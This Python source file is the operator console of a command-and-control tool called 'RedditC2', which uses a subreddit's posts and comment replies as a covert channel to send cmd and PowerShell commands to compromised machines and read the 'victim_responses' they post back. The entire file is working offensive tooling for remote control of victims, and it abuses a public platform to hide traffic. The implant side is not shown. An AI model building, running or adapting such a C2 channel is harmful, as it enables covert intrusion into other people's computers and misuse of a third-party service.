import praw
import random
import string
import time
import os
import json
from prawcore import NotFound

#function to generate a TASKID reddit title:
def randStr(chars = string.ascii_uppercase + string.digits, N=10):
	return ''.join(random.choice(chars) for _ in range(N))
	
#post into the subreddit
def createPost(subreddit_name, title):
    postContent = "" #add a post content if you don't want to leave the post body empty
    # get subreddit
    subreddit = reddit.subreddit(subreddit_name)
    #create a post
    subreddit.submit(title,selftext=postContent)

def verifySession(subreddit_name, listenerID):
    value = True
    for submission in reddit.subreddit(subreddit_name).top('all'):
        if(submission.title == listenerID):
            value = True
            break
        else:
            value = False
    return value
    
def sub_exists(sub):
    exists = True
    try:
        reddit.subreddits.search_by_name(sub, exact=True)
    except NotFound:
        exists = False
    return exists

#read a post with a specific title
def readOutput(subreddit_name, title, command):
    victim_responses = []
    subreddit = reddit.subreddit(subreddit_name)
    resp = subreddit.search(title,limit=10)

    for submission in resp:        
        #look only for comments which has our command in it
        submission.comments.replace_more(limit=None)
        for top_level_comment in submission.comments:
            if(command in top_level_comment.body):
                #ignore the already executed commands
                if top_level_comment.body == "executed":
                    pass
                    
                #now read the below comment, which is the output result
                else:                    
                    for outputTask in top_level_comment.replies:
                        victim_responses.append(outputTask.body)
                        
                    #only edit the reply to "executed" if it has replies in it
                    if (top_level_comment.replies):
                        top_level_comment.edit("executed")
        
        #use recursion when no new reply is found
        if not victim_responses:
            #print("[!] No response, waiting for 5 seconds")
            #time.sleep(5)
            return readOutput(subreddit_name, title, command)
        
        else:
            response = victim_responses[0]
            print("[+] Received Output:\n" + response[5:])

def sendCommand(subreddit_name, title, command):
    subreddit = reddit.subreddit(subreddit_name)
    resp = subreddit.search(title,limit=10)
    
    for submission in resp:
        submission.reply("in: " + command)
    
    

if __name__ == "__main__":
    #retrieve the data from the configuration file
    with open ("config.json", "r") as configFile:
        data = json.load(configFile)

    client_id = data['client_id']
    client_secret = data['client_secret']
    username = data['username']
    password = data['password']
    user_agent = data['user_agent']
    #-------------
    subreddit_name = ""
    #-------------

    # creating an authorized reddit instance
    reddit = praw.Reddit(client_id = client_id,
                     client_secret = client_secret,
                     username = username,
                     password = password,
                     user_agent = user_agent)
                     
    reddit.validate_on_submit = True
    
    while True:
        command = input("RedditC2> ")
        if command[:13] == "set subreddit":
            #validate the subreddit
            if(sub_exists(command[14:])):
                print("[*] Subreddit set to: " + command[14:])
                subreddit_name = command[14:]
            else:
                print("[-] The selected subreddit doesn't exist or doesn't have propper permissions. Try again with another subreddit.")

        #careful, only execute this once
        elif command[:12] == "set listener":
            listener_id = command[13:]
            if(subreddit_name == ""):
                print("[!] Put the value of subreddit")
            else:
                createPost(subreddit_name, listener_id)
                print("[+] Listener created")

        elif command[:12] == "use listener":
            if(subreddit_name == ""):
                print("[!] Put the value of subreddit")
            else:
                selected_listener = command[13:]
                if(verifySession(subreddit_name, selected_listener)):
                    print("[+] Entered the session")

                    while True:
                        session_command = input(selected_listener + "> ")

                        if(session_command == "exit"):
                            break
                    
                        elif(session_command == ""):
                            pass
                    
                        elif(session_command == "clear"):
                            os.system('clear')
                    
                        else:
                            #send the command
                            sendCommand(subreddit_name, selected_listener, session_command)
                            print("[+] Command sent")
                            #then read the output
                            time.sleep(2) #give time for reddit to update
                            readOutput(subreddit_name, selected_listener, session_command)
                else:
                    print("[!] Could not enter the session")


        elif command == 'clear':
            os.system('clear')
            
        elif command == 'exit':
            print("[*] Exiting")
            exit()

        elif command == 'help':
            print("""
set subreddit                 --> Select the subreddit where you will create the listener
set listener [session number] --> Create a post in subreddit where the traffic will ocurr
use listener [session number] --> Interact With Each Session Individually
run [command]                 --> Execute a cmd command
powershell [command]          --> Execute a powershell command
help                          --> Show the help menu
exit                          --> Exit from the session
clear                         --> Clear the screen
                """)

        else:
            print("[-] Command Not Found")
